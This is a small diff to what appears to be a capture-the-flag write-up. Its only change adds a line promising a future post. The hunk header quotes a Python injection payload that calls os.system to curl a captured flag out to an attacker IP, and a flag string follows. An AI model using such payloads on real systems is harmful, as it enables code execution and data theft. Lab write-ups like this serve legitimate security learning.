@@ -147,7 +147,8 @@ __import__('os').system("curl http://10.10.14.7/" + flag)
 ``3xc3pt10n_h4ndl1ng?s0_funny!``
 
 <br>
-<br>
+
+We will write another post soon including more advanced techniques.
 
 Thanks for reading :)
 
